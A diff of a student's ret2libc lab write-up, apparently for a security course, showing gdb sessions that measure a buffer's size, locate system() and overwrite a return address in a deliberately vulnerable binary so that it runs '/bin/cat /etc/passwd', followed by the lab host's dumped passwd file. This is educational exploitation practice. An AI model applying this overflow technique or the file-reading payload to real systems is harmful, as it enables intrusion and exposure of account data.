@@ -1,65 +1,56 @@
-Build exploit:
+The code was tested on "gits" linux lab host in gdb using tmux enviroment
 
-dtrived5@shell:~/CS-576-ROP/hw2-ret2libc$ gdb vuln_prog1.bin
+---
+
+Part-1 > Build exploit:
+
+- Try to locate exact buffer size from multiple attempts
+- Try to estimate string location in the stack
+
+$ gdb vuln_prog1.bin
 
 (gdb) break main
 
-(gdb) run "$(<input1)"
-Starting program: /home/dtrived5/CS-576-ROP/hw2-ret2libc/vuln_prog1.bin "$(<input1)"
-
-Breakpoint 1, 0x080485b8 in main ()
+(gdb) run "$(<malicious_input1.txt)"
 
 (gdb) p system
-$1 = {<text variable, no debug info>} 0xf7e45db0 <system>
-
-(gdb) p _exit
-$2 = {<text variable, no debug info>} 0xf7ebb8a8 <_exit>
-
-(gdb) break *0x080485a4
-Breakpoint 4 at 0x80485a4
+$1 = {<text variable, no debug info>} 0xf7e46db0 <system>
 
 (gdb) c
 Continuing.
 Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?]?????????/bin/cat /etc/passwd
 
-Breakpoint 4, 0x080485a4 in print_argument ()
-
-(gdb) si
-0x080485a7 in print_argument ()
-
-(gdb) x/128bx $esp
-0xffffd7f0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41 ← buffer loc
-
-(gdb) si
-0x080485a9 in print_argument ()
+0xffffd7f0 ← previous buffer address
+0xffffd908 ← previous string address
+0xffffd908 − 0xffffd7f0 = 0x118 ← size of buffer
 
 (gdb) x/128bx $esp
-0xffffd8fc:	0xb0	0x5d	0xe4	0xf7	0xa8	0xc8	0xeb	0xf7 ← return address loc
-0xffffd904:	0x18	0xd9	0xff	0xff	0x2f	0x62	0x69	0x6e
-0xffffd90c:	0x2f	0x63	0x61	0x74	0x20	0x2f	0x65	0x74
-0xffffd914:	0x63	0x2f	0x70	0x61	0x73	0x73	0x77	0x64
+0xffffd6d0:     0xe0    0xd6    0xff    0xff    0x35    0xda    0xff    0xff
+0xffffd6d8:     0x18    0x96    0xe1    0xf7    0xb0    0x51    0xfd    0xf7
+0xffffd6e0:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41 ← buffer start
+0xffffd7e8:     0x41    0x41    0x41    0x41    0xb0    0x6d    0xe4    0xf7 ← buffer end
+0xffffd7f0:     0xef    0xbe    0xad    0xde    0x38    0xd8    0xff    0xff ← 0xffffd838 - incorrect string address
+0xffffd7f8:     0x2f    0x62    0x69    0x6e    0x2f    0x63    0x61    0x74 ← 0xffffd7f8 - new string address
+0xffffd800:     0x20    0x2f    0x65    0x74    0x63    0x2f    0x70    0x61
+0xffffd808:     0x73    0x73    0x77    0x64    0x00    0x46    0xe2    0xf7
 
-0xffffd908 ← argument loc
+---
 
-Run exploit:
+Part-2 > Run exploit:
 
-dtrived5@shell:~/CS-576-ROP/hw2-ret2libc$ nano exploit_1.py 
+$ nano malicious_input1.py 
 
-dtrived5@shell:~/CS-576-ROP/hw2-ret2libc$ python3 exploit_1.py > input1
+$ python3 malicious_input1.py > malicious_input1.txt
 
-dtrived5@shell:~/CS-576-ROP/hw2-ret2libc$ gdb vuln_prog1.bin
+$ gdb vuln_prog1.bin
 
 (gdb) break main
-Breakpoint 1 at 0x80485b8
 
-(gdb) run "$(<input1)"
-Starting program: /home/dtrived5/CS-576-ROP/hw2-ret2libc/vuln_prog1.bin "$(<input1)"
-
-Breakpoint 1, 0x080485b8 in main ()
+(gdb) run "$(<malicious_input1.txt)"
 
 (gdb) c
 Continuing.
-Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?]????????/bin/cat /etc/passwd
+Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?mﾭ?/bin/cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -96,9 +87,7 @@ statd:x:113:65534::/var/lib/nfs:/bin/false
 smmta:x:114:121:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
 smmsp:x:115:122:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
 puppet:x:116:123:Puppet configuration management daemon,,,:/var/lib/puppet:/bin/false
-avahi:x:117:125:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
 monitoring:x:450:450:monitoring:/home/monitoring:/usr/sbin/nologin
 
-Program received signal SIGILL, Illegal instruction.
-0xf7ebc8a9 in ?? () from /lib/i386-linux-gnu/libc.so.6
-
+Program received signal SIGSEGV, Segmentation fault.
+0xdeadbeef in ?? ()
